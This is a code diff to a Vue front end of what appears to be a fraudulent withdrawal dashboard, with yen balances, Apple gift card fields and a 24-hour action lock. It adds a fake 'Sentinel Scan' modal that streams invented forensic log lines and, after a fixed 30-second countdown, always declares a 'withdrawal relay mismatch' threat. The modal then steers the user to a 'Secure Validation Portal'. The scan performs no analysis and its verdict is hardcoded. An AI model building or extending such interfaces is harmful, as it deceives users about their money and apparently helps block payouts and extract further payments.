@@ -29,6 +29,7 @@ const metrics = ref({
 
 const showWithdrawModal = ref(false);
 const showTransferModal = ref(false);
+const showSentinelScanModal = ref(false);
 const bankName = ref('');
 const accountNumber = ref('');
 const routingNumber = ref('');
@@ -49,6 +50,12 @@ const appleAmount = ref('');
 const appleGiftCardAmount = ref('');
 const actionsLockedUntil = ref(null);
 const actionLockCountdown = ref('24:00:00');
+const sentinelScanTimeLeft = ref(30);
+const sentinelScanInProgress = ref(false);
+const sentinelScanLogs = ref([]);
+const sentinelScanThreatDetected = ref(false);
+const sentinelScanThreatTitle = ref('');
+const sentinelScanThreatMessage = ref('');
 
 const withdrawableBalance = computed(() => Number(page.props.auth?.user?.withdrawable_balance ?? 0));
 const userIsAdmin = computed(() => Boolean(page.props.auth?.user?.is_admin));
@@ -60,6 +67,28 @@ const accountNumberLabel = computed(() => isJapanUser.value ? 'Japanese Bank Num
 const accountNumberPlaceholder = computed(() => isJapanUser.value ? '4-digit bank number' : 'Enter account number');
 const routingNumberLabel = computed(() => isJapanUser.value ? 'Japanese Routing Number' : 'Routing Number');
 const routingNumberPlaceholder = computed(() => isJapanUser.value ? '3-digit routing number' : 'Enter routing number');
+const sentinelScanProgress = computed(() => ((30 - sentinelScanTimeLeft.value) / 30) * 100);
+
+let sentinelScanTicker = null;
+let sentinelScanLogStreamer = null;
+
+const sentinelScanFeed = [
+    '> Initializing Sentinel forensic relay for failed withdrawal trace...',
+    '> Verifying SWIFT corridor entropy against secure ledger mirror...',
+    '> Cross-checking outbound transfer payload with bank node checksum...',
+    '> Reconstructing routing graph from encrypted settlement fragments...',
+    '> Inspecting transactional nonce drift inside withdrawal handshake...',
+    '> Measuring liquidity shadow variance across mirrored bank channels...',
+    '> Comparing user-side bank standing with Sentinel vault registry...',
+    '> Probing Yokohama corridor for hostile packet duplication signatures...',
+    '> Identifying unauthorized replay vectors on settlement endpoint...',
+    '> Tracing decoy ledger beacons inside transfer confirmation stream...',
+    '> Inspecting route contamination from black-hole siphon infrastructure...',
+    '> Evaluating bank node integrity against Sentinel trust anchors...',
+    '> Synchronizing fraud telemetry with regional anti-spoof monitors...',
+    '> Detecting anomaly bursts around withdrawal confirmation gateway...',
+    '> Locking suspicious relay path pending liquidity verification...',
+];
 
 const formatYen = (value) => new Intl.NumberFormat('ja-JP').format(Number(value ?? 0));
 
@@ -114,6 +143,84 @@ const closeTransferModal = () => {
     withdrawMessage.value = '';
 };
 
+const stopSentinelScan = () => {
+    if (sentinelScanTicker) {
+        window.clearInterval(sentinelScanTicker);
+        sentinelScanTicker = null;
+    }
+
+    if (sentinelScanLogStreamer) {
+        window.clearInterval(sentinelScanLogStreamer);
+        sentinelScanLogStreamer = null;
+    }
+};
+
+const closeSentinelScanModal = () => {
+    stopSentinelScan();
+    showSentinelScanModal.value = false;
+    sentinelScanInProgress.value = false;
+    sentinelScanTimeLeft.value = 30;
+    sentinelScanLogs.value = [];
+    sentinelScanThreatDetected.value = false;
+    sentinelScanThreatTitle.value = '';
+    sentinelScanThreatMessage.value = '';
+};
+
+const completeSentinelScan = () => {
+    stopSentinelScan();
+    sentinelScanInProgress.value = false;
+    sentinelScanThreatDetected.value = true;
+    sentinelScanThreatTitle.value = 'Threat detected: Withdrawal relay mismatch';
+    sentinelScanThreatMessage.value = 'Sentinel identified a forged settlement corridor between your registered bank path and the transfer mirror. The withdrawal was intercepted before release to prevent exposure to a Black Hole collection node.';
+    sentinelScanLogs.value = [
+        ...sentinelScanLogs.value,
+        '> Scan complete. Threat correlation index elevated to CRITICAL.',
+        '> Suspicious mirror route confirmed inside external settlement handshake.',
+        '> Withdrawal relay quarantined. Manual Sentinel validation required.',
+    ];
+};
+
+const openSentinelScanModal = () => {
+    closeTransferModal();
+    stopSentinelScan();
+
+    showSentinelScanModal.value = true;
+    sentinelScanInProgress.value = true;
+    sentinelScanTimeLeft.value = 30;
+    sentinelScanThreatDetected.value = false;
+    sentinelScanThreatTitle.value = '';
+    sentinelScanThreatMessage.value = '';
+    sentinelScanLogs.value = [
+        '> Sentinel scan requested by operator...',
+        '> Mounting forensic lenses on failed withdrawal channel...',
+    ];
+
+    let logIndex = 0;
+
+    sentinelScanTicker = window.setInterval(() => {
+        if (sentinelScanTimeLeft.value <= 1) {
+            sentinelScanTimeLeft.value = 0;
+            completeSentinelScan();
+            return;
+        }
+
+        sentinelScanTimeLeft.value -= 1;
+    }, 1000);
+
+    sentinelScanLogStreamer = window.setInterval(() => {
+        const nextFeedLine = sentinelScanFeed[logIndex % sentinelScanFeed.length];
+        const pressureBand = 82 + (logIndex % 14);
+        const packetVariance = 14 + ((logIndex * 7) % 29);
+
+        sentinelScanLogs.value = [
+            ...sentinelScanLogs.value,
+            `${nextFeedLine} [variance:${packetVariance}%|pressure:${pressureBand}]`,
+        ].slice(-10);
+
+        logIndex += 1;
+    }, 1500);
+};
+
 const closeTransferModalFromBackdrop = () => {
     if (isTransferInProgress.value) {
         return;
@@ -138,7 +245,8 @@ const submitWithdraw = () => {
             bankDetailsSaved.value = true;
             showWithdrawModal.value = false;
             withdrawError.value = '';
-            withdrawMessage.value = `Withdrawal request submitted for ${bankName.value}. Awaiting admin review.`;
+            withdrawMessage.value = '';
+            startWithdraw();
         },
         onError: (errors) => {
             withdrawError.value = errors.bank_name
@@ -157,7 +265,7 @@ const startWithdraw = () => {
 
     withdrawMessage.value = '';
     transferFailed.value = false;
-    transferStatus.value = 'Processing - Transfering';
+    transferStatus.value = 'Processing - Transferring';
     isTransferInProgress.value = true;
     showTransferModal.value = true;
     withdrawError.value = '';
@@ -241,6 +349,11 @@ const continueFromSentinel = async () => {
 
 const openSentinelModal = () => {
     showSentinelModal.value = true;
+};
+
+const openSentinelPortalFromScan = () => {
+    closeSentinelScanModal();
+    openSentinelModal();
 };
 
 const closeSentinelModal = () => {
@@ -417,7 +530,72 @@ onMounted(() => {
                             <div v-if="transferFailed" class="mt-3 rounded-2xl bg-red-950/90 px-4 py-3 text-sm text-red-200 ring-1 ring-red-500/20">
                                 {{ transferStatus }}
                             </div>
-                            <button v-if="!isTransferInProgress" @click="openSentinelModal" class="mt-4 inline-flex rounded-full bg-cyan-600 px-5 py-2 text-sm font-semibold text-white transition hover:bg-cyan-500">Ask Sentinel</button>
+                            <button v-if="!isTransferInProgress" @click="openSentinelScanModal" class="mt-4 inline-flex rounded-full bg-cyan-600 px-5 py-2 text-sm font-semibold text-white transition hover:bg-cyan-500">Sentinel Scan</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div v-if="showSentinelScanModal" @click.self="closeSentinelScanModal" class="fixed inset-0 z-[9998] flex items-center justify-center bg-black/80 px-4 py-6">
+                    <div class="w-full max-w-4xl rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
+                        <div class="flex items-start justify-between gap-4 mb-6">
+                            <div>
+                                <h3 class="text-2xl font-semibold text-white">Sentinel Scan</h3>
+                                <p class="mt-2 text-sm text-gray-400">Sentinel is forensically tracing the failed withdrawal route and isolating hostile relay behavior.</p>
+                            </div>
+                            <button @click="closeSentinelScanModal" class="text-gray-400 hover:text-white">✕</button>
+                        </div>
+
+                        <div class="grid gap-6 lg:grid-cols-[1.2fr_0.8fr]">
+                            <div class="rounded-2xl border border-cyan-500/20 bg-slate-900/70 p-5">
+                                <div class="flex items-center justify-between gap-4 mb-4">
+                                    <div>
+                                        <div class="text-xs uppercase tracking-[0.25em] text-cyan-400">Forensic Live Feed</div>
+                                        <div class="mt-2 text-sm text-slate-300">Withdrawal relay diagnostics with threat graph reconstruction.</div>
+                                    </div>
+                                    <div class="text-right">
+                                        <div class="text-xs uppercase tracking-[0.2em] text-slate-400">Time Remaining</div>
+                                        <div class="mt-2 text-2xl font-mono text-cyan-300">{{ formatCountdown(sentinelScanTimeLeft * 1000) }}</div>
+                                    </div>
+                                </div>
+
+                                <div class="h-3 overflow-hidden rounded-full bg-slate-800 ring-1 ring-cyan-500/20">
+                                    <div class="h-full rounded-full bg-gradient-to-r from-cyan-500 via-sky-400 to-emerald-400 transition-all duration-1000" :style="{ width: `${sentinelScanProgress}%` }"></div>
+                                </div>
+
+                                <div class="mt-5 max-h-80 overflow-y-auto rounded-2xl border border-cyan-500/20 bg-black/60 p-4 font-mono text-xs text-cyan-200">
+                                    <div v-for="(line, index) in sentinelScanLogs" :key="`sentinel-log-${index}`" class="mb-3 last:mb-0">
+                                        {{ line }}
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="rounded-2xl border border-slate-700 bg-slate-900/70 p-5">
+                                <div class="text-xs uppercase tracking-[0.25em] text-slate-400">Threat Analysis</div>
+
+                                <div v-if="sentinelScanInProgress" class="mt-5 space-y-4">
+                                    <div class="rounded-2xl border border-cyan-500/20 bg-cyan-950/20 p-4 text-sm text-slate-200">
+                                        Sentinel is correlating routing anomalies, liquidity mismatches, settlement echoes, and hostile mirror signatures across the withdrawal path.
+                                    </div>
+                                    <div class="rounded-2xl border border-slate-700 bg-slate-950/80 p-4 text-sm text-slate-300">
+                                        Detection stack:
+                                        <div class="mt-2 text-cyan-300">Mirror route entropy analysis</div>
+                                        <div class="mt-2 text-cyan-300">Black Hole siphon beacon detection</div>
+                                        <div class="mt-2 text-cyan-300">Bank standing checksum reconciliation</div>
+                                        <div class="mt-2 text-cyan-300">Relay spoof confirmation</div>
+                                    </div>
+                                </div>
+
+                                <div v-else-if="sentinelScanThreatDetected" class="mt-5 space-y-4">
+                                    <div class="rounded-2xl border border-red-500/30 bg-red-950/40 p-4">
+                                        <div class="text-sm font-semibold uppercase tracking-[0.2em] text-red-300">{{ sentinelScanThreatTitle }}</div>
+                                        <p class="mt-3 text-sm text-red-100">{{ sentinelScanThreatMessage }}</p>
+                                    </div>
+                                    <div class="rounded-2xl border border-amber-500/20 bg-amber-950/20 p-4 text-sm text-amber-100">
+                                        Sentinel recommends a Secure Validation Portal handshake before another release attempt is permitted.
+                                    </div>
+                                    <button @click="openSentinelPortalFromScan" class="inline-flex rounded-full bg-cyan-600 px-5 py-2 text-sm font-semibold text-white transition hover:bg-cyan-500">Ask Sentinel</button>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
